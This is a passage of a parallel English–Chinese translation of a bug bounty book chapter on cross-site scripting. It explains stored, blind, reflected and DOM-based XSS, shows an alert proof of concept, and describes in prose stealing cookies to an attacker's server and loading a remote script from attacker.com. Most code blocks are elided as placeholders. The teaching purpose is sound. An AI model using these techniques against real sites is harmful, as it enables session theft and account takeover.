- en: '6'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '6'
- en: Cross-Site Scripting
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 跨站脚本攻击
- en: '![](image_fi/book_art/chapterart.png)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![](image_fi/book_art/chapterart.png)'
- en: Let’s start with *cross-site scripting (**XSS**)*, one of the most common bugs
    reported to bug bounty programs. It’s so prevalent that, year after year, it shows
    up in OWASP’s list of the top 10 vulnerabilities threatening web applications.
    It’s also HackerOne’s most reported vulnerability, with more than $4 million paid
    out in 2020 alone.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从*跨站脚本攻击（**XSS**）*开始，它是报告给漏洞奖励计划中最常见的错误之一。它的普遍性如此之高，以至于每年它都会出现在OWASP列出的十大威胁网页应用的漏洞中。它也是HackerOne报告次数最多的漏洞，仅2020年就支付了超过400万美元的奖励。
- en: An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s
    browser. If an application fails to distinguish between user input and the legitimate
    code that makes up a web page, attackers can inject their own code into pages
    viewed by other users. The victim’s browser will then execute the malicious script,
    which might steal cookies, leak personal information, change site contents, or
    redirect the user to a malicious site. These malicious scripts are often JavaScript
    code but can also be HTML, Flash, VBScript, or anything written in a language
    that the browser can execute.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: XSS漏洞发生在攻击者能够在受害者的浏览器上执行自定义脚本时。如果应用程序未能区分用户输入和构成网页的合法代码，攻击者就能将自己的代码注入到其他用户查看的页面中。受害者的浏览器将执行这个恶意脚本，可能会窃取Cookies、泄露个人信息、修改网站内容，或将用户重定向到恶意网站。这些恶意脚本通常是JavaScript代码，但也可以是HTML、Flash、VBScript或任何浏览器能够执行的语言编写的代码。
- en: In this chapter, we’ll dive into what XSS vulnerabilities are, how to exploit
    them, and how to bypass common protections. We’ll also discuss how to escalate
    XSS vulnerabilities when you find one.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将深入探讨XSS漏洞是什么，如何利用这些漏洞，以及如何绕过常见的防护措施。我们还将讨论在发现XSS漏洞时如何进行升级。
- en: Mechanisms
  id: totrans-6
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 机制
- en: In an XSS attack, the attacker injects an executable script into HTML pages
    viewed by the user. This means that to understand XSS, you’ll have to first understand
    JavaScript and HTML syntax.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 在XSS攻击中，攻击者将可执行脚本注入到用户查看的HTML页面中。这意味着，要理解XSS，首先需要理解JavaScript和HTML语法。
- en: 'Web pages are made up of HTML code whose elements describe the page’s structure
    and contents. For example, an `<h1>` tag defines a web page’s header, and a `<p>`
    tag represents a paragraph of text. The tags use corresponding closing tags, like
    `</h1>` and `</p>`, to indicate where the contents of the element should end.
    To see how this works, save this code in a file named *test.html*:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 网页由HTML代码构成，其元素描述了页面的结构和内容。例如，`<h1>`标签定义了网页的头部，而`<p>`标签代表一段文本。标签使用相应的结束标签，如`</h1>`和`</p>`，来指示元素内容的结束位置。为了了解这个是如何工作的，可以将以下代码保存为名为*test.html*的文件：
- en: '[PRE0]'
  id: totrans-9
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Now open it with your web browser. You can do this by right-clicking the HTML
    file, clicking **Open With**, and then selecting your preferred web browser, like
    Google Chrome, Mozilla Firefox, or Microsoft Internet Explorer. Or you can simply
    open your web browser and drag the HTML file into the browser window. You should
    see a simple web page like [Figure 6-1](#figure6-1).
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，用你的网页浏览器打开该文件。你可以通过右键点击HTML文件，选择**用...打开**，然后选择你喜欢的浏览器，如Google Chrome、Mozilla
    Firefox或Microsoft Internet Explorer，来打开它。或者，你也可以直接打开浏览器并将HTML文件拖进浏览器窗口。你应该能看到一个简单的网页，像[图6-1](#figure6-1)一样。
- en: '![f06001](image_fi/501546c06/f06001.png)'
  id: totrans-11
  prefs: []
  type: TYPE_IMG
  zh: '![f06001](image_fi/501546c06/f06001.png)'
- en: 'Figure 6-1: Our simple HTML page rendered in a browser'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 图6-1：我们在浏览器中渲染的简单HTML页面
- en: In addition to formatting text, HTML lets you embed images with `<img>` tags,
    create user-input forms with `<form>` tags, link to external pages with `<a>`
    tags, and perform many other tasks. A full tutorial on how to write HTML code
    is beyond the scope of this chapter, but you can use W3School’s tutorial ([https://www.w3schools.com/html/default.asp](https://www.w3schools.com/html/default.asp))
    as a resource.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 除了格式化文本外，HTML还允许你使用`<img>`标签嵌入图像，使用`<form>`标签创建用户输入表单，使用`<a>`标签链接到外部页面，以及执行许多其他任务。如何编写HTML代码的完整教程超出了本章的范围，但你可以参考W3School的教程（[https://www.w3schools.com/html/default.asp](https://www.w3schools.com/html/default.asp)）作为资源。
- en: 'HTML also allows the inclusion of executable scripts within HTML documents
    using `<script>` tags. Websites use these scripts to control client-side application
    logic and make the website interactive. For example, the following script generates
    a `Hello!` pop-up on the web page:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: HTML还允许在HTML文档中嵌入可执行脚本，使用`<script>`标签。网站使用这些脚本来控制客户端应用逻辑，并使网站具有互动性。例如，以下脚本会在网页上生成一个`Hello!`的弹窗：
- en: '[PRE1]'
  id: totrans-15
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Scripts like this one that are embedded within an HTML file instead of loaded
    from a separate file are called *inline scripts*. These scripts are the cause
    of many XSS vulnerabilities. (Besides embedding a script inside the HTML page
    as an inline script, sites can also load JavaScript code as an external file,
    like this: `<script src="``URL_OF_EXTERNAL_SCRIPT``"></script>`.)'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 这种嵌入在HTML文件中的脚本，而不是从单独的文件加载的脚本，称为 *内联脚本*。这些脚本是许多XSS漏洞的根源。（除了将脚本嵌入HTML页面作为内联脚本，网站还可以将JavaScript代码作为外部文件加载，如：`<script
    src="``URL_OF_EXTERNAL_SCRIPT``"></script>`。）
- en: To see why, let’s say that our site contains an HTML form that allows visitors
    to subscribe to a newsletter ([Figure 6-2](#figure6-2)).
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 为了了解原因，假设我们的网站包含一个允许访客订阅新闻通讯的HTML表单（[图 6-2](#figure6-2)）。
- en: '![f06002](image_fi/501546c06/f06002.png)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
  zh: '![f06002](image_fi/501546c06/f06002.png)'
- en: 'Figure 6-2: Our HTML page with an HTML form'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6-2：我们的HTML页面与HTML表单
- en: 'The source HTML code of the page looks like this:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 页面源HTML代码看起来像这样：
- en: '[PRE2]'
  id: totrans-21
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: After a visitor inputs an email address, the website confirms it by displaying
    it on the screen ([Figure 6-3](#figure6-3)).
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 在访客输入电子邮件地址后，网站通过在屏幕上显示该地址来确认它（[图 6-3](#figure6-3)）。
- en: '![f06003](image_fi/501546c06/f06003.png)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
  zh: '![f06003](image_fi/501546c06/f06003.png)'
- en: 'Figure 6-3: The confirmation message after a visitor subscribes to our newsletter'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6-3：访客订阅我们新闻通讯后的确认消息
- en: 'The HTML that generates the confirmation message looks like this; HTML `<b>`
    tags indicate boldface text:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 生成确认消息的HTML看起来像这样；HTML `<b>` 标签表示粗体文本：
- en: '[PRE3]'
  id: totrans-26
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The page constructs the message by using user input. Now, what if a user decides
    to input a script instead of an email address in the email form? For instance,
    a script that sets the `location` of a web page will make the browser redirect
    to the location specified:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 页面通过使用用户输入来构建消息。现在，如果用户决定在电子邮件表单中输入脚本而不是电子邮件地址呢？例如，一个设置网页 `location` 的脚本会使浏览器重定向到指定的位置：
- en: '[PRE4]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: The attacker could enter this script into the email form field and click Submit
    ([Figure 6-4](#figure6-4)).
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以将此脚本输入到电子邮件表单字段中并点击提交（[图 6-4](#figure6-4)）。
- en: '![f06004](image_fi/501546c06/f06004.png)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![f06004](image_fi/501546c06/f06004.png)'
- en: 'Figure 6-4: An attacker can enter a script instead of an email in the input
    field.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6-4：攻击者可以在输入字段中输入脚本而不是电子邮件。
- en: 'If the website doesn’t validate or sanitize the user input before constructing
    the confirmation message, the page source code would become the following:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 如果网站在构建确认消息之前没有验证或清理用户输入，页面源代码将变成以下内容：
- en: '[PRE5]'
  id: totrans-33
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: '*Validating* user input means that the application checks that the user input
    meets a certain standard—in this case, does not contain malicious JavaScript code.
    *Sanitizing* user input, on the other hand, means that the application modifies
    special characters in the input that can be used to interfere with HTML logic
    before further processing.'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '*验证*用户输入意味着应用程序检查用户输入是否符合某个标准——在这种情况下，不包含恶意的JavaScript代码。另一方面，*清理*用户输入意味着应用程序会在进一步处理之前修改输入中的特殊字符，这些字符可能会干扰HTML逻辑。'
- en: 'As a result, the inline script would cause the page to redirect to *attacker.com*.
    XSS happens when attackers can inject scripts in this manner onto a page that
    another user is viewing. The attacker can also use a different syntax to embed
    malicious code. The `src` attribute of the HTML `<script>` tag allows you to load
    JavaScript from an external source. This piece of malicious code will execute
    the contents of *http://attacker.com/xss.js/* on the victim’s browser during an
    XSS attack:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 结果是，内联脚本会导致页面重定向到 *attacker.com*。XSS发生在攻击者能够以这种方式将脚本注入到另一个用户正在查看的页面时。攻击者还可以使用不同的语法嵌入恶意代码。HTML
    `<script>` 标签的 `src` 属性允许你从外部源加载JavaScript。这段恶意代码将在XSS攻击期间执行 *http://attacker.com/xss.js/*
    的内容，目标浏览器中：
- en: '[PRE6]'
  id: totrans-36
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'This example isn’t really exploitable, because attackers have no way of injecting
    the malicious script on other users’ pages. The most they could do is redirect
    themselves to the malicious page. But let’s say that the site also allows users
    to subscribe to the newsletter by visiting the URL *https://subscribe.example.com?email=SUBSCRIBER_EMAIL*.
    After users visit the URL, they will be automatically subscribed, and the same
    confirmation will be shown on the web page. In this case, attackers can inject
    the script by tricking users into visiting a malicious URL:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 这个例子实际上并不可被利用，因为攻击者无法在其他用户的页面上注入恶意脚本。他们最多只能将自己重定向到恶意页面。但假设该网站还允许用户通过访问URL*https://subscribe.example.com?email=SUBSCRIBER_EMAIL*来订阅新闻邮件。在用户访问该URL后，他们将自动订阅，且网页上会显示相同的确认信息。在这种情况下，攻击者可以通过欺骗用户访问恶意URL来注入脚本：
- en: '[PRE7]'
  id: totrans-38
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Since the malicious script gets incorporated into the page, the victim’s browser
    will think the script is part of that site. Then the injected script can access
    any resources that the browser stores for that site, including cookies and session
    tokens. Attackers can, therefore, use these scripts to steal information and bypass
    access control. For example, attackers might steal user cookies by making the
    victim’s browser send a request to the attacker’s IP with the victim’s cookie
    as a URL parameter:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 由于恶意脚本被嵌入到页面中，受害者的浏览器会认为该脚本是该网站的一部分。然后，注入的脚本可以访问浏览器为该网站存储的任何资源，包括cookies和会话令牌。因此，攻击者可以利用这些脚本窃取信息并绕过访问控制。例如，攻击者可能会通过使受害者的浏览器向攻击者的IP发送请求，同时将受害者的cookie作为URL参数，来窃取用户的cookie：
- en: '[PRE8]'
  id: totrans-40
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: This script contains JavaScript code to load an image from the attacker’s server,
    with the user’s cookies as part of the request. The browser will send a GET request
    to the attacker’s IP, with the URL parameter `c` (for *cookie*) containing the
    user’s `document.cookie`, which is the victim user’s cookie on the current site.
    In this way, attackers can use the XSS to steal other users’ cookies by inspecting
    incoming requests on their server logs. Note that if the session cookie has the
    `HttpOnly` flag set, JavaScript will not be able to read the cookie, and therefore
    the attacker will not be able to exfiltrate it. Nevertheless, XSS can be used
    to execute actions on the victim’s behalf, modify the web page the victim is viewing,
    and read the victim’s sensitive information, such as CSRF tokens, credit card
    numbers, and any other details rendered on their page.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 该脚本包含JavaScript代码，用于从攻击者的服务器加载图片，并将用户的cookies作为请求的一部分。浏览器会向攻击者的IP发送GET请求，URL参数`c`（代表*cookie*）包含用户的`document.cookie`，即当前网站上受害者用户的cookie。通过这种方式，攻击者可以通过检查他们服务器日志中的传入请求，利用XSS窃取其他用户的cookies。请注意，如果会话cookie设置了`HttpOnly`标志，JavaScript将无法读取该cookie，因此攻击者无法将其提取出来。不过，XSS仍然可以用来代表受害者执行操作、修改受害者正在查看的网页，并读取受害者的敏感信息，如CSRF令牌、信用卡号码以及网页上呈现的其他任何细节。
- en: Types of XSS
  id: totrans-42
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: XSS类型
- en: 'There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS.
    The difference between these types is in how the XSS payload travels before it
    gets delivered to the victim user. Some XSS flaws also fall into special categories:
    blind XSS and self-XSS, which we’ll talk about in a bit.'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: XSS有三种类型：存储型XSS、反射型XSS和基于DOM的XSS。这些类型之间的区别在于XSS负载在传送到受害者用户之前的传播方式。有些XSS漏洞还属于特殊类别：盲XSS和自我XSS，我们稍后会讲到。
- en: Stored XSS
  id: totrans-44
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 存储型XSS
- en: '*Stored XSS* happens when user input is stored on a server and retrieved unsafely.
    When an application accepts user input without validation, stores it in its servers,
    and then renders it on users’ browsers without sanitization, malicious JavaScript
    code can make its way into the database and then to victims’ browsers.'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: '*存储型XSS*发生在用户输入被存储在服务器上并且未经过安全处理时。当应用程序接受未经验证的用户输入，将其存储在服务器上，然后在未进行清理的情况下渲染到用户的浏览器中时，恶意的JavaScript代码就可能进入数据库并最终传送到受害者的浏览器。'
- en: Stored XSS is the most severe XSS type that we will discuss in this chapter,
    because it has the potential of attacking many more users than reflected, DOM,
    or self-XSS. Sometimes during a stored-XSS attack, all the user has to do to become
    a victim is to view a page with the payload embedded, whereas reflected and DOM
    XSS usually require the user to click a malicious link. Finally, self-XSS requires
    a lot of social engineering to succeed.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 存储型XSS是我们在本章讨论的最严重的XSS类型，因为它比反射型、DOM型或自XSS有潜力攻击更多的用户。有时，在存储型XSS攻击中，用户只需查看嵌入了有效负载的页面就能成为受害者，而反射型和DOM型XSS通常需要用户点击恶意链接。最后，自XSS则需要大量的社会工程学技巧才能成功。
- en: During a stored XSS attack, attackers manage to permanently save their malicious
    scripts on the target application’s servers for others to access. Perhaps they’re
    able to inject the script in the application’s user database. Or maybe they get
    it in the server logs, on a message board, or in comment field. Every time users
    access the stored information, the XSS executes in their browser.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 在存储型XSS攻击中，攻击者成功地将其恶意脚本永久保存在目标应用程序的服务器上，供其他人访问。也许他们能够将脚本注入到应用程序的用户数据库中，或者他们可能会将其放入服务器日志、留言板或评论字段中。每次用户访问存储的信息时，XSS都会在他们的浏览器中执行。
- en: For example, let’s say a comment field on an internet forum is vulnerable to
    XSS. When a user submits a comment to a blog post, that user input is not validated
    or sanitized in any way before it gets rendered to anyone who views that blog
    post. An attacker can submit a comment with JavaScript code and have that code
    executed by any user who views that blog post!
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，假设一个互联网论坛的评论字段易受XSS攻击。当用户提交评论到博客文章时，该用户输入不会在呈现给任何查看该博客文章的人之前进行任何验证或清理。攻击者可以提交带有JavaScript代码的评论，并让任何查看该博客文章的用户执行该代码！
- en: 'A great proof of concept for XSS is to generate an alert box in the browser
    via injected JavaScript code, so let’s give that a try. The JavaScript code `alert(''XSS
    by Vickie'')` will generate a pop-up on the victim’s browser that reads `XSS by
    Vickie`:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 一个很好的XSS概念验证是通过注入JavaScript代码在浏览器中生成一个警告框，让我们来试一下。JavaScript代码`alert('XSS by
    Vickie')`将在受害者的浏览器中生成一个弹出窗口，显示`XSS by Vickie`：
- en: '[PRE9]'
  id: totrans-50
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'If submitted, this message would become embedded on the forum page’s HTML code,
    and the page would be displayed to all the visitors who view that comment:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 如果提交，这条消息将嵌入到论坛页面的HTML代码中，页面将显示给所有查看该评论的访问者：
- en: '[PRE10]'
  id: totrans-52
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '[Figure 6-5](#figure6-5) shows the two messages rendered in a browser.'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '[图6-5](#figure6-5)显示了浏览器中渲染的两条消息。'
- en: '![f06005](image_fi/501546c06/f06005.png)'
  id: totrans-54
  prefs: []
  type: TYPE_IMG
  zh: '![f06005](image_fi/501546c06/f06005.png)'
- en: 'Figure 6-5: The HTML page with two messages rendered in the browser. You can
    see that the attacker’s message is blank because the browser interprets it as
    a script instead of text.'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 图6-5：浏览器中渲染的包含两条消息的HTML页面。您可以看到攻击者的消息为空，因为浏览器将其解释为脚本而不是文本。
- en: When you load this HTML page in your browser, you’ll see the attacker’s comment
    field displayed as blank. This is because your browser interpreted `<script>alert('XSS
    by Vickie');</script>` located in the `<p>` tags as a script, not as regular text.
    You should notice a pop-up window that reads `XSS by Vickie`.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 当您在浏览器中加载此HTML页面时，您会看到攻击者的评论字段显示为空。这是因为您的浏览器将位于`<p>`标签中的`<script>alert('XSS
    by Vickie');</script>`解释为脚本，而不是普通文本。您应该会看到一个弹出窗口，显示`XSS by Vickie`。
- en: Every time a user views the comment on the forum, their browser will execute
    the embedded JavaScript. Stored XSS tends to be the most dangerous because attackers
    can attack many victims with a single payload.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 每次用户查看论坛中的评论时，他们的浏览器都会执行嵌入的JavaScript。存储型XSS通常是最危险的，因为攻击者只需使用一个有效负载，就能攻击多个受害者。
- en: Blind XSS
  id: totrans-58
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 盲XSS
- en: '*Blind XSS* vulnerabilities are stored XSS vulnerabilities whose malicious
    input is stored by the server and executed in another part of the application
    or in another application that you cannot see.'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: '*盲XSS*漏洞是存储型XSS漏洞，其恶意输入被服务器存储并在应用程序的其他部分或您无法看到的另一个应用程序中执行。'
- en: For example, let’s say that a page on *example.com* allows you to send a message
    to the site’s support staff. When a user submits a message, that input is not
    validated or sanitized in any way before it gets rendered to the site’s admin
    page. An attacker can submit a message with JavaScript code and have that code
    executed by any admin who views that message.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，假设*example.com*上的一个页面允许您向网站的支持人员发送消息。当用户提交消息时，这些输入不会在呈现到网站管理员页面之前进行任何验证或清理。攻击者可以提交包含JavaScript代码的消息，并让任何查看该消息的管理员执行该代码。
- en: These XSS flaws are harder to detect, since you can’t find them by looking for
    reflected input in the server’s response, but they can be just as dangerous as
    regular stored XSS vulnerabilities. Often, blind XSS can be used to attack administrators,
    exfiltrate their data, and compromise their accounts.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 这些 XSS 漏洞更难以检测，因为你无法通过查找服务器响应中的反射输入来发现它们，但它们可能和常规的存储型 XSS 漏洞一样危险。通常，盲 XSS 可以用来攻击管理员，窃取他们的数据，甚至危及他们的账户。
- en: Reflected XSS
  id: totrans-62
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 反射型 XSS
- en: '*Reflected XSS* vulnerabilities happen when user input is returned to the user
    without being stored in a database. The application takes in user input, processes
    it server-side, and immediately returns it to the user.'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: '*反射型 XSS* 漏洞发生在用户输入被返回给用户时，而没有存储在数据库中。应用程序接收用户输入，在服务器端处理，并立即返回给用户。'
- en: 'The first example I showed, with the email form, involved a reflected XSS attack.
    These issues often happen when the server relies on user input to construct pages
    that display search results or error messages. For example, let’s say a site has
    a search functionality. The user can input a search term via a URL parameter,
    and the page will display a message containing the term at the top of the results
    page. If a user searches *abc*, the source code for the related message might
    look like this:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 我展示的第一个例子，涉及了一个反射型 XSS 攻击。这些问题通常发生在服务器依赖用户输入构建显示搜索结果或错误信息的页面时。例如，假设一个网站有一个搜索功能。用户可以通过
    URL 参数输入搜索词，页面会在结果页顶部显示包含该词的消息。如果用户搜索 *abc*，与该消息相关的源代码可能是这样的：
- en: '[PRE11]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'If the search functionality displays any user-submitted search string on the
    results page, a search term like the following would cause a script to become
    embedded on the results page and executed by the browser:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 如果搜索功能在结果页面显示任何用户提交的搜索字符串，像以下的搜索词会导致一个脚本被嵌入到结果页面，并被浏览器执行：
- en: '[PRE12]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: If an attacker can trick victims into visiting this URL, the payload will become
    embedded in their version of the page, making the victim’s browser run whatever
    code the attacker would like. Unlike stored XSS, which allows attackers to execute
    code on anyone who accesses their stored resources, reflected XSS enables attackers
    to execute code on the browsers of victims who click their malicious links.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者能诱使受害者访问这个 URL，负载将嵌入到他们页面的版本中，导致受害者的浏览器运行攻击者希望执行的任何代码。与存储型 XSS 不同，存储型 XSS
    允许攻击者在任何访问其存储资源的人上执行代码，而反射型 XSS 使得攻击者能够在点击恶意链接的受害者的浏览器上执行代码。
- en: DOM-Based XSS
  id: totrans-69
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 基于 DOM 的 XSS
- en: '*DOM-based XSS* is similar to reflected XSS, except that in DOM-based XSS,
    the user input never leaves the user’s browser. In DOM-based XSS, the application
    takes in user input, processes it on the victim’s browser, and then returns it
    to the user.'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '*基于 DOM 的 XSS* 类似于反射型 XSS，只是基于 DOM 的 XSS 中，用户输入从不离开用户的浏览器。在基于 DOM 的 XSS 中，应用程序接收用户输入，在受害者的浏览器上处理，然后再返回给用户。'
- en: 'The *Document Object Model (DOM)* is a model that browsers use to render a
    web page. The DOM represents a web page’s structure; it defines the basic properties
    and behavior of each HTML element, and helps scripts access and modify the contents
    of the page. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s
    local copy of the web page instead of going through the server. Attackers are
    able to attack the DOM when a page takes user-supplied data and dynamically alters
    the DOM based on that input. JavaScript libraries like jQuery are prone to DOM-based
    XSS since they dynamically alter DOM elements.'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: '*文档对象模型（DOM）* 是浏览器用来渲染网页的模型。DOM 表示网页的结构；它定义了每个 HTML 元素的基本属性和行为，并帮助脚本访问和修改页面内容。基于
    DOM 的 XSS 直接攻击网页的 DOM：它攻击的是客户端的本地网页副本，而不是通过服务器。攻击者能够在页面接收用户提供的数据并根据这些输入动态更改 DOM
    时攻击 DOM。像 jQuery 这样的 JavaScript 库容易遭受基于 DOM 的 XSS，因为它们动态地更改 DOM 元素。'
- en: As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s
    user input. Unlike reflected XSS, a DOM-based XSS script doesn’t require server
    involvement, because it executes when user input modifies the source code of the
    page in the browser directly. The XSS script is never sent to the server, so the
    HTTP response from the server won’t change.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 如同反射型 XSS，攻击者通过受害者的用户输入提交基于 DOM 的 XSS 负载。与反射型 XSS 不同，基于 DOM 的 XSS 脚本不需要服务器的参与，因为它在用户输入直接修改浏览器中页面源代码时执行。XSS
    脚本从未发送到服务器，因此服务器的 HTTP 响应不会发生变化。
- en: 'This might all sound a bit abstract, so let’s consider an example. Say a website
    allows the user to change their locale by submitting it via a URL parameter:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 这一切可能听起来有些抽象，我们来考虑一个例子。假设一个网站允许用户通过 URL 参数提交更改他们的语言环境：
- en: '[PRE13]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'The web page’s client-side code will use this locale to construct a welcome
    message whose HTML looks like this:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 网页的客户端代码将使用此语言环境来构建欢迎信息，其 HTML 代码如下所示：
- en: '[PRE14]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'The URL parameter isn’t submitted to the server. Instead, it’s used locally,
    by the user’s browser, to construct a web page by using a client-side script.
    But if the website doesn’t validate the user-submitted locale parameter, an attacker
    can trick users into visiting a URL like this one:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: URL 参数不会提交到服务器，而是由用户的浏览器在本地使用客户端脚本构建网页。但如果网站未对用户提交的语言环境参数进行验证，攻击者可以诱使用户访问像这样的
    URL：
- en: '[PRE15]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: The site will embed the payload on the user’s web page, and the victim’s browser
    will execute the malicious script.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 该网站将在用户的网页中嵌入有效载荷，受害者的浏览器将执行恶意脚本。
- en: DOM XSS may sound a lot like reflected XSS at first. The difference is that
    the reflected XSS payload gets sent to the server and returned to the user’s browser
    within an HTTP response. On the other hand, the DOM XSS payload is injected onto
    a page because of client-side code rendering user input in an insecure manner.
    Although the results of the two attacks are similar, the processes of testing
    for them and protecting against them are different.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: DOM XSS 起初可能听起来很像反射型 XSS。不同之处在于，反射型 XSS 有效载荷会被发送到服务器并通过 HTTP 响应返回到用户的浏览器。另一方面，DOM
    XSS 有效载荷是由于客户端代码不安全地渲染用户输入而注入到页面中的。虽然这两种攻击的结果类似，但它们的测试和防护过程不同。
- en: 'The user input fields that can lead to reflected and DOM-based XSS aren’t always
    URL parameters. Sometimes they show up as URL fragments or pathnames. *URL fragments*
    are strings, located at the end of a URL, that begin with a `#` character. They
    are often used to automatically direct users to a section within a web page or
    transfer additional information. For example, this is a URL with a fragment that
    takes the user to the `#about_us` section of the site’s home page:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 可能导致反射型和基于 DOM 的 XSS 的用户输入字段并不总是 URL 参数。有时它们出现在 URL 片段或路径中。*URL 片段* 是位于 URL
    末尾的字符串，以 `#` 字符开头。它们通常用于自动将用户引导到网页中的某个部分或传递附加信息。例如，这是一个带有片段的 URL，将用户引导到该网站主页的
    `#about_us` 部分：
- en: '[PRE16]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: We’ll talk more about the components of a URL in Chapter 7. For information
    about DOM XSS and some example payloads, see the PortSwigger article “DOM-Based
    XSS” at [https://portswigger.net/web-security/cross-site-scripting/dom-based/](https://portswigger.net/web-security/cross-site-scripting/dom-based/).
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在第七章中详细讨论 URL 的组成部分。关于 DOM XSS 和一些示例有效载荷的信息，请参阅 PortSwigger 文章“DOM-Based
    XSS”：[https://portswigger.net/web-security/cross-site-scripting/dom-based/](https://portswigger.net/web-security/cross-site-scripting/dom-based/)。
- en: Self-XSS
  id: totrans-84
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 自我 XSS
- en: '*Self-XSS attacks* require victims to input a malicious payload themselves.
    To perform these, attackers must trick users into doing much more than simply
    viewing a page or browsing to a particular URL.'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: '*自我 XSS 攻击* 要求受害者自行输入恶意有效载荷。要执行这些攻击，攻击者必须欺骗用户做的不仅仅是查看页面或浏览到特定 URL。'
